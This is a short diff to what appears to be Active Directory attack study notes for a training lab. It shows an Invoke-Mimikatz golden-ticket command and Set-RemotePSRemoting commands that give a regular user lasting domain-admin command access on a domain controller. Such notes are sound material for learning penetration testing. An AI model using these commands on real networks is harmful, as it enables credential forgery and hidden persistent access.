@@ -539,9 +539,10 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - On local machiine for student1
   - `Set-RemotePSRemoting -UserName student1 -Verbose`
 - On remote machine for student1 without credentials:
-  - `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Verbose`
+  - `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Verbose` - Mostly this
 - On remote machine, remove the permissions:
   - `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Remove`
+ - User student1 can now execute commands as of domain admin.
 
 **Remote Registry**
 - Using DAMP, with admin privs on remote machine
